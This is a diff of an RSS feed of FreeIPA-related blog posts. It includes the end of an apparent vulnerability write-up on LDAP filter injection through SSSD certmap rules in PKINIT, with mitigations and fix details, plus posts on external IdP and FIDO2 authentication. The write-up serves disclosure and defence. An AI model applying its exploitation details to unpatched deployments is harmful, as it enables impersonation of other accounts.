+exploitation than &lt;em&gt;and-list&lt;/em&gt; or single-clause filters. This is
+because the attacker has more flexibility in how to make the filter
+match the target account. But as we saw in the wildcard &lt;code&gt;dNSName&lt;/code&gt;
+example, even a single-clause filter fragment could be exploitable.&lt;/p&gt;
+&lt;div class=&quot;note&quot;&gt;
+&lt;p&gt;The default ACIs allow any authenticated account to read certmap
+rule entries. This may aid attackers in working out the attack
+details.&lt;/p&gt;
+&lt;/div&gt;
+&lt;p&gt;Note that most &lt;em&gt;free-form&lt;/em&gt; attributes have additional syntax rules
+imposed upon them. For example, a SAN &lt;code&gt;dNSName&lt;/code&gt; value should look
+like a DNS name, and a SAN &lt;code&gt;rfc822Name&lt;/code&gt; value should be a valid
+email address. But the raw ASN.1 data does not guarantee this.
+Even legal values can be problematic (as demonstrated). But if a
+trusted CA can be induced to issue certificates that contain
+&lt;em&gt;arbitrary&lt;/em&gt; data in those free-form attributes, there is an even
+greater risk of exploitation.&lt;/p&gt;
+&lt;p&gt;The use of the internal CA in this attack is incidental. The
+administrator can configure FreeIPA to trust external CAs for
+validating client PKINIT certificates. Any trusted CA can be used
+in the attack, if the attacker can cause it to issue certificates
+containing problematic values. Note that the KDC trusts the whole
+system trust store, not just the trusted CAs from the FreeIPA CA
+trust store. Certmap rules can be equipped with &lt;em&gt;matching rules&lt;/em&gt; to
+restrict which issuers are allowed for PKINIT certificate matching,
+separate from CA trust for certification path verification purposes.&lt;/p&gt;
+&lt;h2 id=&quot;mitigations&quot;&gt;Mitigations &lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#mitigations&quot; class=&quot;section&quot;&gt;§&lt;/a&gt;&lt;/h2&gt;
+&lt;h3 id=&quot;use-exact-certificate-matching-do-not-use-certmap-rules&quot;&gt;Use exact certificate matching / do not use certmap rules &lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#use-exact-certificate-matching-do-not-use-certmap-rules&quot; class=&quot;section&quot;&gt;§&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;PKINIT uses exact certificate matching by default. If feasible, you
+can rely on that method and disable or delete any certmap rules.
+&lt;code&gt;ipa certmaprule-find&lt;/code&gt; lists all certmap rules that have been
+defined. Use &lt;code&gt;ipa certmaprule-disable NAME&lt;/code&gt; or &lt;code&gt;ipa certmaprule-del NAME&lt;/code&gt; to disable or delete certmap rules, respectively.&lt;/p&gt;
+&lt;p&gt;The main drawback to this approach is that each principal’s entry
+must have an up-to-date &lt;code&gt;userCertificate&lt;/code&gt; attribute containing the
+user’s certificate(s). This increases the size of entries, and may
+have additional adminstrative overhead depending on how certificates
+are issued and managed.&lt;/p&gt;
+&lt;h3 id=&quot;audit-and-de-risk-certmap-rules&quot;&gt;Audit and de-risk certmap rules &lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#audit-and-de-risk-certmap-rules&quot; class=&quot;section&quot;&gt;§&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;Non-santised parameter substitution in an LDAP filter &lt;em&gt;or-list&lt;/em&gt; is
+riskier than in &lt;em&gt;and-lists&lt;/em&gt; lists or single . Replace certmap rules
+containing &lt;em&gt;or&lt;/em&gt; lists with multiple, separate certmap rules.&lt;/p&gt;
+&lt;p&gt;Ensure each rule is as specific as possible, and consider the
+possibility of outlier or malicious values in the certificate when
+designing certmap rules.&lt;/p&gt;
+&lt;h3 id=&quot;review-ca-trust-profiles-and-validation&quot;&gt;Review CA trust, profiles and validation &lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#review-ca-trust-profiles-and-validation&quot; class=&quot;section&quot;&gt;§&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;Review the kinds of data, especially user-supplied or user-writeable
+data, that can be included on certificates issued by CAs that are
+trusted for PKINIT purposes. Audit how those data are validated.&lt;/p&gt;
+&lt;p&gt;Review and limit which CAs are trusted for PKINIT to only those that
+are necessary. If possible, consider using dedicated CAs for
+issuing the client certificates used for PKINIT. Use the certmap
+&lt;em&gt;matching rule&lt;/em&gt; feature (not discussed here) to restrict the KDC to
+only allow certificates issued by the PKINIT CAs.&lt;/p&gt;
+&lt;h2 id=&quot;fix&quot;&gt;Fix &lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#fix&quot; class=&quot;section&quot;&gt;§&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Lack of sanitisation in certmap LDAP filter construction was
+recognised as a bug in SSSD issue &lt;a href=&quot;https://pagure.io/SSSD/sssd/issue/4180&quot;&gt;pagure#4180&lt;/a&gt; / &lt;a href=&quot;https://github.com/SSSD/sssd/issues/5135&quot;&gt;github#5135&lt;/a&gt;.
+The framing of the issue was that legitimate values in the
+certificate were causing SSSD to construct invalid LDAP filters. It
+appears that the security implications were not recognised or
+discussed at that time.&lt;/p&gt;
+&lt;p&gt;SSSD commit &lt;a href=&quot;https://github.com/SSSD/sssd/commit/a2b9a84460429181f2a4fa7e2bb5ab49fd561274&quot;&gt;a2b9a84460429181f2a4fa7e2bb5ab49fd561274&lt;/a&gt;
+implemented the required sanitisation. &lt;a href=&quot;https://sssd.io/release-notes/sssd-2.3.1.html&quot;&gt;SSSD 2.3.1&lt;/a&gt; was the first
+release containing the fix. Commit
+&lt;a href=&quot;https://github.com/SSSD/sssd/commit/918fb32af6a271230bf87db47f78768edb9ca86c&quot;&gt;918fb32af6a271230bf87db47f78768edb9ca86c&lt;/a&gt; on
+&lt;strong&gt;2022-01-06&lt;/strong&gt; backported the fix to the &lt;code&gt;sssd-1.16&lt;/code&gt; branch, but
+there has not yet been a new release from this branch containing the
+fix.&lt;/p&gt;
+&lt;p&gt;The SSSD team backported the fix to RHEL 7.9. It was included in
+Batch Update 20 which was released on &lt;strong&gt;2022-01-24&lt;/strong&gt;. Fixes to
+extended support streams for RHEL 8.1 and 8.2 were also released on
+that day, meaning that the issue is now fixed in all supported
+versions of RHEL.&lt;/p&gt;</description>
+	<pubDate>Thu, 02 Feb 2023 00:00:00 +0000</pubDate>
+</item>
+<item>
 	<title>Fraser Tweedale: Enabling Kubernetes feature gates in OpenShift</title>
 	<guid>https://frasertweedale.github.io/blog-redhat/posts/2023-01-22-openshift-feature-gates.html</guid>
 	<link>https://frasertweedale.github.io/blog-redhat/posts/2023-01-22-openshift-feature-gates.html</link>
@@ -127,6 +663,230 @@ schema&lt;/a&gt;.&lt;/p&gt;</description>
 	<link></link>
 	<description>The dogtag PKI CA provides its own command-line tools for reading and writing configuration. Some of these require authentication in order to work. On the CA machine as root you have access to the NSS certificate database so can use the subsystem certificate for authentication, like: # pki -d /etc/pki/pki-tomcat/alias -n 'subsystemCert cert-pki-ca' -f /etc/pki/pki-tomcat/password.conf &amp;#8230; &lt;a href=&quot;https://rcritten.wordpress.com/2023/01/13/authentication-for-the-pki-command/&quot; class=&quot;more-link&quot;&gt;Continue reading &lt;span class=&quot;screen-reader-text&quot;&gt;Authentication for the pki command&lt;/span&gt; &lt;span class=&quot;meta-nav&quot;&gt;&amp;#8594;&lt;/span&gt;&lt;/a&gt;</description>
 	<pubDate>Fri, 13 Jan 2023 16:41:25 +0000</pubDate>
+</item>
+<item>
+	<title>Alexander Bokovoy: FreeIPA authentication improvements and Fedora Infrastructure part 2</title>
+	<guid>https://vda.li/en/posts/2022/10/28/FreeIPA-Authentication-Improvements-and-Fedora-Infra-2/</guid>
+	<link>https://vda.li/en/posts/2022/10/28/FreeIPA-Authentication-Improvements-and-Fedora-Infra-2/</link>
+	<description>&lt;p&gt;This article continues the &lt;a href=&quot;https://vda.li/en/posts/2022/10/28/FreeIPA-Authentication-Improvements-and-Fedora-Infra/&quot;&gt;discussion&lt;/a&gt;
+about FreeIPA authentication improvements and how they could benefit Fedora
+Infrastructure.&lt;/p&gt;
+
+&lt;p&gt;FreeIPA 4.9.10 has added support for &lt;a href=&quot;https://freeipa.readthedocs.io/en/latest/workshop/12-external-idp-support.html&quot;&gt;relaying
+authentication&lt;/a&gt;
+to OAuth2 identity providers (IdPs). Users would get their access to FreeIPA
+resources mediated by an external OAuth2 identity provider which supports OAuth2
+device authorization grant flow (RFC 8628). This is not too dissimilar from how
+smart TVs connect to Youtube and other media services on your behalf. A user
+would be able to grant access to a scoped information to a FreeIPA OAuth2 client
+registered with such IdP. In order to authorize the access, the user might need
+to login to the IdP first and this is performed with the help of a browser
+running elsewhere. Most common browsers do have support for Webauthn/FIDO2
+tokens, thus it is possible to build a system where a login to FreeIPA-enrolled
+system is authenticated by the FIDO2 token exclusively.&lt;/p&gt;
+
+&lt;p&gt;Based on the result of the external IdP authorization grant, FreeIPA would then
+issue a Kerberos ticket to the user. The ticket can then be used for single
+sign-on across all FreeIPA services.&lt;/p&gt;
+
+&lt;p&gt;The functionality to authenticate against an external IdP is already available
+in Fedora 36 versions of FreeIPA and SSSD. It is also available in RHEL 8.7 and
+9.1 beta versions published in late September 2022.&lt;/p&gt;
+
+&lt;p&gt;Relying on an external identity provider to authenticate your FreeIPA users
+would also mean rethinking the relationship between the IdP and the FreeIPA
+deployment. Typically, when people integrated FreeIPA with OAuth2 or SAML
+identity providers, an assumption was made that user authentication is handled
+by the FreeIPA servers and identity provider issues a token for a web
+application. Turning this situation around means FreeIPA only becomes a user
+data store – maybe even not the data store for the IdP itself. IdP would only
+need to know about the user identity from its own point of view while FreeIPA
+would have a POSIX identity of the same user, consumed by other applications.
+Whether it is visible through the IdP grants or via POSIX interfaces is more of
+an application implementation detail. Decoupling these details leads to a bit of
+duplication, of course, but allows for better flexibility. A user might come
+from a federated source and have their authentication handled by a different
+identity provider – their public service provider like Google, Github, Gitlab,
+or Microsoft Azure. Or Facebook and any other social media.&lt;/p&gt;
+
+&lt;p&gt;All this, however, would mean a change to the way Fedora Accounts system
+and Fedora IdP, Ipsilon, interact with each other. Right now Ipsilon
+sources accounts information from the FreeIPA instance directly and
+delegates authentication to it as well (though PAM service provided by
+SSSD). Fedora Accounts system, in its turn, manages passwords and tokens
+in the FreeIPA instance. Since FreeIPA does not have support for
+Webauthn/FIDO2 web-based authentication yet, Ipsilon would need to
+manage that itself. So some user accounts would need to source their
+authentication details from FreeIPA and some would need to use Ipsilon’s
+internal source. That is a bit complicated as Ipsilon has no way to
+combine data sources.&lt;/p&gt;
+
+&lt;p&gt;Ipsilon does not have any support for both OAuth2 device authorization
+grant flow and Webauthn/FIDO2 tokens. Even if the FreeIPA instance used
+by both Fedora project and CentOS project would be updated to provide
+external IdP authentication, the Ipsilon instance would not be able to
+utilize this new feature.&lt;/p&gt;
+
+&lt;p&gt;Another alternative would be to use Keycloak (free software project upon which
+Red Hat Single Sign-On product is built). Keycloak 21 is adding multiple user
+stores support and the FreeIPA team works on &lt;a href=&quot;https://github.com/justin-stephenson/scim-keycloak-user-storage-spi&quot;&gt;a new
+provider&lt;/a&gt;
+to utilize it. This new Keycloak user store plugin supports SCIM v2 API and also
+needs a &lt;a href=&quot;https://github.com/freeipa/ipa-tuura&quot;&gt;new FreeIPA application&lt;/a&gt; that
+abstracts out access to FreeIPA resources as a SCIM v2 API. In the end, it is
+the same SSSD as a backend as in case of the Ipsilon IdP but with the ability to
+split the data store across multiple sources. Keycloak already has support for
+both OAuth2 device authorization grant flow and the Webauthn/FIDO2 tokens. How
+this all works together is shown in our &lt;a href=&quot;https://www.youtube.com/watch?v=NorXJN3tw3Q&amp;list=PL0x39xti0_65yq9EuNtSLts0qm9_T-YiI&amp;index=34&quot;&gt;&lt;em&gt;Nest with Fedora 2022
+talk&lt;/em&gt;&lt;/a&gt;.
+Talk slides can be &lt;a href=&quot;https://vda.li/talks/2022/2022-Nest-With-Fedora-FreeIPA-and-OAuth2.pdf&quot;&gt;found here&lt;/a&gt;
+but the video includes a live demo session.&lt;/p&gt;
+
+&lt;p&gt;On mobile devices front, both Google and Apple are gearing towards introduction
+of software tokens for Webauthn/FIDO2, often called ‘passkeys’ in the
+user-oriented marketing materials. These passkeys effectively shared across
+devices where a user is logged in and uses a shared password wallet. The Google
+Security team &lt;a href=&quot;https://security.googleblog.com/2022/10/SecurityofPasskeysintheGooglePasswordManager.html&quot;&gt;goes at
+length&lt;/a&gt;
+explaining why this is secure, although some researchers &lt;a href=&quot;https://medium.com/@arkenoi/what-is-wrong-with-apple-passkeys-1d044072c5a3&quot;&gt;aren’t
+convinced&lt;/a&gt;
+(this is more about Apple implementation, though).&lt;/p&gt;
+
+&lt;p&gt;Consuming software tokens stored in a mobile device from a computer for
+authentication would need additional support from the identity providers.
+Neither Ipsilon nor Keycloak implement that. For native Android applications
+&lt;a href=&quot;https://android-developers.googleblog.com/2022/10/bringing-passkeys-to-android-and-chrome.html&quot;&gt;Google just announced&lt;/a&gt;
+they’ll provide an API in what remains of 2022.&lt;/p&gt;
+
+&lt;p&gt;Finally, going outside of Fedora Project’s infrastructure, supporting
+Webauthn/FIDO2 to login to Linux servers and desktops in a centrally
+managed way is still not there.&lt;/p&gt;
+
+&lt;p&gt;Both FreeIPA and SSSD teams are working on a more direct integration
+with FIDO2 tokens. Instead of relying on an OAuth2 identity provider to
+handle Webauthn/FIDO2 operations in the browser, SSSD is integrating
+with libfido2 library to make FIDO2 token’s use on the machine locally.
+This would replace the pam_u2f module and would allow FreeIPA to provide
+centralized management of the FIDO2-based passkeys. On top of that,
+FreeIPA will provide Kerberos integration: login with the FIDO2 token
+would be turned into a Kerberos ticket and single sign-on operations
+would be ensured across multiple services, like it is done today for
+traditional Kerberos pre-authentication methods. A benefit is that
+passwords can be completely removed for the users with direct FIDO2
+token enrollment.&lt;/p&gt;
+
+&lt;p&gt;FreeIPA-enrolled clients (Fedora 36+, RHEL 8.7/9.1 betas) already can login via
+external IdP as outlined above but only for the SSH or a direct console login.
+Login over graphical desktop is not working well: a message telling to visit an
+IdP page and authorize the device access does not fit into a gdm login entry
+which is used to show the message coming from the PAM stack. GDM is also not
+able to go to that URL directly as there is still no support for opening a
+browser instance pre-login in GNOME or any other desktop manager. We are looking
+at implementing this with GNOME developers similar to how a smartcard selection
+was added in 2017. Hopefully, this will come to one of the next Fedora versions
+…&lt;/p&gt;
+
+&lt;p&gt;Notwithstanding open issues, we are pretty much close to enabling
+FreeIPA-enrolled Linux systems to go passwordless. It is not yet a year
+of passwordless Linux like not a year of Linux on the desktop but making
+it reality is not that far away. Perhaps I am too optimistic, though –
+like we were all before with Linux on the desktop.&lt;/p&gt;</description>
+	<pubDate>Fri, 28 Oct 2022 06:50:00 +0000</pubDate>
+</item>
+<item>
+	<title>Alexander Bokovoy: FreeIPA authentication improvements and Fedora Infrastructure part 1</title>
+	<guid>https://vda.li/en/posts/2022/10/28/FreeIPA-Authentication-Improvements-and-Fedora-Infra/</guid>
+	<link>https://vda.li/en/posts/2022/10/28/FreeIPA-Authentication-Improvements-and-Fedora-Infra/</link>
+	<description>&lt;p&gt;The Fedora project exists because of its contributors. Their contributions shape
+the landscape of Linux distributions in a direct way but they also have made a
+significant influence on the Open Source projects themselves. Fedora
+contributors are not only people who participate in package maintenance, there
+are upstream developers, documentation writers, quality assurance engineers
+across multiple industries, students, volunteers and many many others. As with
+many other areas, this participation is bi-directional and practices established
+in the Fedora project may apply elsewhere too.&lt;/p&gt;
+
+&lt;p&gt;One area dear to me is authentication. The FreeIPA project serves as an umbrella
+to provide a consistent centralized identity management and authentication
+solution for Linux systems (in the first place, though standards-compliant,
+UNIX-like operating systems benefit from its use as well). FreeIPA’s core is
+built around Kerberos authentication protocol and SSSD daemon. It makes use of
+Kerberos’ features for single sign-on ease on the client side.&lt;/p&gt;
+
+&lt;p&gt;Many Free Software and Open Source projects use FreeIPA to deploy centralized
+identity management, authentication and authorization for their own
+contributors. Examples can be found small and large: GNOME project was one of
+the earliest, &lt;a href=&quot;https://mail.gnome.org/archives/infrastructure-announce/2014-October/msg00001.html&quot;&gt;&lt;em&gt;migrating its infrastructure&lt;/em&gt;&lt;/a&gt;
+to FreeIPA in 2014. The Fedora project is not an exception, it has been using
+FreeIPA for quite some time, though FreeIPA deployment was only handling
+Kerberos – user accounts were stored in a different place and synchronized with
+FreeIPA. The old Fedora account system was gradually rewritten to be built on
+top of FreeIPA and in 2021 all accounts were migrated to the new system.&lt;/p&gt;
+
+&lt;p&gt;Fedora accounts system allows users to login with a password and
+optionally to use two-factor authentication with the help of TOTP
+tokens. Users can also associate GnuPG or SSH public keys with
+themselves. These details get consumed by various Fedora applications
+but there are several important use cases:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Issue Kerberos ticket which can be used to authenticate against a
+build system used by Fedora&lt;/li&gt;
+  &lt;li&gt;Access servers over SSH protocol, with Kerberos tickets or SSH keys&lt;/li&gt;
+  &lt;li&gt;Use Kerberos ticket or authenticate with password to Fedora
+Project’s identity provider and authorize Fedora applications to
+access user data.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;FreeIPA supports more authentication methods in its Kerberos implementation but
+they aren’t used by the Fedora project. On the other hand, the CentOS Project
+shares its FreeIPA instance with Fedora and uses certificates issued by the
+FreeIPA CA for its authentication. These certificates can be used to obtain
+Kerberos tickets as well. For both projects this FreeIPA instance is maintained
+by the Community Platform Engineering team who looks after both communities’
+needs.&lt;/p&gt;
+
+&lt;p&gt;Since the Fedora Project is an important gateway to Red Hat Enterprise Linux,
+many Fedora contributors were recently raising security concerns around secure
+software delivery and asking how we can improve authentication and authorization
+for Fedora infrastructure. For gory details, &lt;a href=&quot;https://lists.fedoraproject.org/archives/list/devel@lists.fedoraproject.org/thread/UG3UOKBVJLUWZYEHWL52KPMITPEPEBNF/&quot;&gt;&lt;em&gt;the
+thread&lt;/em&gt;&lt;/a&gt;
+about removing access of inactive packagers after Fedora 37 release has a
+&lt;a href=&quot;https://lists.fedoraproject.org/archives/list/devel@lists.fedoraproject.org/message/42GIRNMSLPVU7AUMAJZRIYKAR7Y5S3PY/&quot;&gt;&lt;em&gt;few&lt;/em&gt;&lt;/a&gt;
+&lt;a href=&quot;https://lists.fedoraproject.org/archives/list/devel@lists.fedoraproject.org/message/AB2X2SMKVEZBW4XLUMGIMLMB2YFB3HT4/&quot;&gt;&lt;em&gt;examples&lt;/em&gt;&lt;/a&gt;.
+A common agreement is that use of Webauthn and FIDO2 tokens &lt;a href=&quot;https://lists.fedoraproject.org/archives/list/devel@lists.fedoraproject.org/message/3FIMWGN233AFMPPYSRNSLQKYYRPHUNGC/&quot;&gt;&lt;em&gt;would definitely
+improve the security&lt;/em&gt;&lt;/a&gt;,
+especially coupled with the prevention of an authentication methods’ downgrades.&lt;/p&gt;
+
+&lt;p&gt;Moving to Webauthn/FIDO2 would probably be relatively easy if every single
+application to access in the Fedora infrastructure would be a web-based. For
+example, OAuth2 clients could be forced to operate on specific scopes of the
+user data which would only be granted if strong authentication methods were used
+to authenticate. For SSH-based access it would also be possible to get SSH keys
+based on a native FIDO2 support in OpenSSH and prevent use of other key types.
+However, a single sign-on functionality would be lost then as currently it is
+not possible to convert SSH public key access to Kerberos tickets nor is it
+possible to use FIDO2 keys natively in Kerberos flows.&lt;/p&gt;
+
+&lt;p&gt;Use of FIDO2 tokens introduces another problem, though, this time a social one.
+Fedora Project is famous for its wide contributor base, spanning many countries
+and continents. Fedora Project contributors come from all kinds of backgrounds
+and so far the only requirement to enable their contributions from a technical
+point of view was internet access. Even enforcement of the two-factor
+authentication with the help of TOTP tokens could have been mitigated by use of
+a software token on a mobile device or simulated on a computer. In many
+countries access to mobile devices is easier than to any hardware token. It is
+still a cost and somebody has to pay for it. The cheapest FIDO2 token is around
+10 EUR, although a single token can be used against many resources (websites).
+There is a cost to enforce stronger authentication methods and somebody would
+need to pay it if the Fedora project chooses to raise the requirements. Perhaps,
+companies benefiting from the secure software development processes around
+Fedora distribution would be willing to step up?&lt;/p&gt;
+
+&lt;p&gt;In &lt;a href=&quot;https://vda.li/en/posts/2022/10/28/FreeIPA-Authentication-Improvements-and-Fedora-Infra-2/&quot;&gt;the next article&lt;/a&gt;
+I will look at how FreeIPA could help with the technical side of supporting
+Webauthn/FIDO2 use by Fedora contributors.&lt;/p&gt;</description>
+	<pubDate>Fri, 28 Oct 2022 05:50:00 +0000</pubDate>
 </item>
 <item>
 	<title>Fraser Tweedale: Controlling header formatting in JAX-RS applications</title>
@@ -2371,396 +3131,6 @@ modified &lt;code&gt;runc&lt;/code&gt; onto worker nodes, I will get on with tes
 	<pubDate>Tue, 29 Jun 2021 00:00:00 +0000</pubDate>
 </item>
 <item>
-	<title>Fraser Tweedale: systemd, cgroups and subuid ranges</title>
-	<guid>https://frasertweedale.github.io/blog-redhat/posts/2021-06-09-systemd-cgroups-subuid.html</guid>
-	<link>https://frasertweedale.github.io/blog-redhat/posts/2021-06-09-systemd-cgroups-subuid.html</link>
-	<description>&lt;h1 id=&quot;systemd-cgroups-and-subuid-ranges&quot;&gt;systemd, cgroups and subuid ranges&lt;/h1&gt;
-&lt;p&gt;In my &lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/2021-05-27-oci-runtime-spec-runc.html&quot;&gt;previous post&lt;/a&gt; I experimented with &lt;code&gt;runc&lt;/code&gt; as a way of
-understanding the behaviour of OCI runtimes. I ended up focusing on
-cgroup creation and the interaction between &lt;code&gt;runc&lt;/code&gt; and &lt;em&gt;systemd&lt;/em&gt;.
-The experiment revealed a critical deficiency: when using user
-namespaces the container’s cgroup is not owned by the user executing
-the container process. As a result, &lt;em&gt;systemd&lt;/em&gt;-based workloads
-cannot run.&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;runc&lt;/code&gt; creates cgroups via systemd’s &lt;em&gt;transient unit API&lt;/em&gt;. Could
-a container runtime use this API to control the cgroup ownership?
-Let’s find out.&lt;/p&gt;
-&lt;h2 id=&quot;how-runc-talks-to-systemd&quot;&gt;How &lt;code&gt;runc&lt;/code&gt; talks to &lt;em&gt;systemd&lt;/em&gt; &lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#how-runc-talks-to-systemd&quot; class=&quot;section&quot;&gt;§&lt;/a&gt;&lt;/h2&gt;
-&lt;p&gt;The &lt;em&gt;Open Container Initiative (OCI)&lt;/em&gt; &lt;a href=&quot;https://github.com/opencontainers/runtime-spec&quot;&gt;runtime spec&lt;/a&gt; defines a
-low-level container runtime interface. OCI runtimes must create the
-Linux namespaces specified by an OCI config, including the cgroup
-namespace.&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;runc&lt;/code&gt; uses the systemd D-Bus API to ask systemd to create a cgroup
-scope for the container. Then it creates a cgroup namespace with
-the new cgroup scope as the root. We can see that &lt;code&gt;runc&lt;/code&gt; invokes
-the &lt;code&gt;StartTransientUnit&lt;/code&gt; API method with a name for the new unit,
-and a list of properties
-(&lt;a href=&quot;https://github.com/opencontainers/runc/blob/v1.0.0-rc95/vendor/github.com/coreos/go-systemd/v22/dbus/methods.go#L198-L200&quot;&gt;source code&lt;/a&gt;):&lt;/p&gt;
-&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode go&quot;&gt;&lt;code class=&quot;sourceCode go&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#cb1-1&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;// .../go-systemd/v22/dbus/methods.go&lt;/span&gt;&lt;/span&gt;
-&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#cb1-2&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;(&lt;/span&gt;c &lt;span class=&quot;op&quot;&gt;*&lt;/span&gt;Conn&lt;span class=&quot;op&quot;&gt;)&lt;/span&gt; StartTransientUnitContext&lt;span class=&quot;op&quot;&gt;(&lt;/span&gt;&lt;/span&gt;
-&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#cb1-3&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;  ctx context&lt;span class=&quot;op&quot;&gt;.&lt;/span&gt;Context&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt; name &lt;span class=&quot;dt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt; mode &lt;span class=&quot;dt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt;&lt;/span&gt;
-&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#cb1-4&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;  properties &lt;span class=&quot;op&quot;&gt;[]&lt;/span&gt;Property&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt; ch &lt;span class=&quot;kw&quot;&gt;chan&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;&amp;lt;-&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;{&lt;/span&gt;&lt;/span&gt;
-&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#cb1-5&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;  &lt;span class=&quot;cf&quot;&gt;return&lt;/span&gt; c&lt;span class=&quot;op&quot;&gt;.&lt;/span&gt;startJob&lt;span class=&quot;op&quot;&gt;(&lt;/span&gt;&lt;/span&gt;
-&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#cb1-6&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;    ctx&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt; ch&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt;&lt;/span&gt;
-&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#cb1-7&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;st&quot;&gt;&amp;quot;org.freedesktop.systemd1.Manager.StartTransientUnit&amp;quot;&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt;&lt;/span&gt;
-&lt;span id=&quot;cb1-8&quot;&gt;&lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#cb1-8&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;    name&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt; mode&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt; properties&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bu&quot;&gt;make&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;([]&lt;/span&gt;PropertyCollection&lt;span class=&quot;op&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;op&quot;&gt;))&lt;/span&gt;&lt;/span&gt;
-&lt;span id=&quot;cb1-9&quot;&gt;&lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#cb1-9&quot; tabindex=&quot;-1&quot;&gt;&lt;/a&gt;&lt;span class=&quot;op&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;Most of the unit configuration is passed as properties.&lt;/p&gt;
-&lt;h2 id=&quot;the-user-property&quot;&gt;The &lt;code&gt;User=&lt;/code&gt; property &lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#the-user-property&quot; class=&quot;section&quot;&gt;§&lt;/a&gt;&lt;/h2&gt;
-&lt;p&gt;&lt;a href=&quot;https://www.freedesktop.org/software/systemd/man/systemd.exec.html#User=&quot;&gt;&lt;code&gt;systemd.exec(5)&lt;/code&gt;&lt;/a&gt; describes the properties that
-configure a systemd unit (including transient units). Among the
-properties are &lt;code&gt;User=&lt;/code&gt; and &lt;code&gt;Group=&lt;/code&gt;:&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;Set the UNIX user or group that the processes are executed as,
-respectively. Takes a single user or group name, or a numeric ID
-as argument.&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;This sounds promising. Further searching turned up a systemd
-documentation page entitled &lt;a href=&quot;https://systemd.io/CGROUP_DELEGATION/&quot;&gt;Control Group APIs and
-Delegation&lt;/a&gt;. That document states:&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;By turning on the &lt;code&gt;Delegate=&lt;/code&gt; property for a scope or service you
-get a few guarantees: … If your service makes use of the &lt;code&gt;User=&lt;/code&gt;
-functionality, then the sub-tree will be &lt;code&gt;chown()&lt;/code&gt;ed to the
-indicated user so that it can correctly create cgroups below it.&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;&lt;code&gt;runc&lt;/code&gt; already supplies &lt;code&gt;Delegate=true&lt;/code&gt;. The &lt;code&gt;User=&lt;/code&gt; property seems
-to be exactly what we need.&lt;/p&gt;
